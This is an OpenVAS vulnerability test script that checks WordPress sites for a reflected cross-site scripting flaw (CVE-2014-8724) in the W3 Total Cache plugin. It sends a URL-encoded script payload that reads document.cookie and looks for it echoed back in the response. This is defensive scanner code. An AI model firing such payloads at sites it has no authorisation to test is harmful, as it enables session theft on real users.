###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_w3_total_cache_xss_vuln.nasl 11974 2018-10-19 06:22:46Z cfischer $
#
# Wordpress W3 Total Cache Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805117");
  script_version("$Revision: 11974 $");
  script_cve_id("CVE-2014-8724");
  script_bugtraq_id(71665);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 08:22:46 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-12-23 19:03:57 +0530 (Tue, 23 Dec 2014)");
  script_name("Wordpress W3 Total Cache Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Wordpress
  W3 Total Cache and is prone to cross site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw is due to improper validation of input
  that contains the Cache Key and is passed via the URL before returning it
  to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser session
  in the context of an affected site.");

  script_tag(name:"affected", value:"Wordpress W3 Total Cache version
  before 0.9.4.1");

  script_tag(name:"solution", value:"Upgrade to version 0.9.4.1 or higher.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://wpvulndb.com/vulnerabilities/7718");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/129626");
  script_xref(name:"URL", value:"https://www.secuvera.de/advisories/secuvera-SA-2014-01.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/w3-total-cache");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + "/wp-content/plugins/w3-total-cache/index.html";

if(http_vuln_check(port:http_port, url:url,
   check_header:TRUE, pattern:"HTTP/1.. 200 OK"))
{
  url = dir + '/wp-content/plugins/w3-total-cache/%22%3E%3C'
            + 'script%3Ealert(document.cookie)%3C/script%3E%22';

  if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
    pattern:"<script>alert\(document\.cookie\)</script>"))
  {
    security_message(port:http_port);
    exit(0);
  }
}
